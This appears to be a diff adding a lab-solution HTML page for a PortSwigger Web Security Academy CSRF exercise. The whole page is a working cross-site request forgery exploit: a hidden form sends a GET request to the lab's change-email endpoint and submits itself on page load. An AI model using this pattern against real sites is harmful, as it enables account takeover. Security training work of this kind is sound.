@@ -1,0 +1,12 @@
+
+<!-- https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method -->
+<html>
+    <body>
+        <form method="GET" action="https://0a63005c0352763ac05e95f500c400b2.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="email@test.com">
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
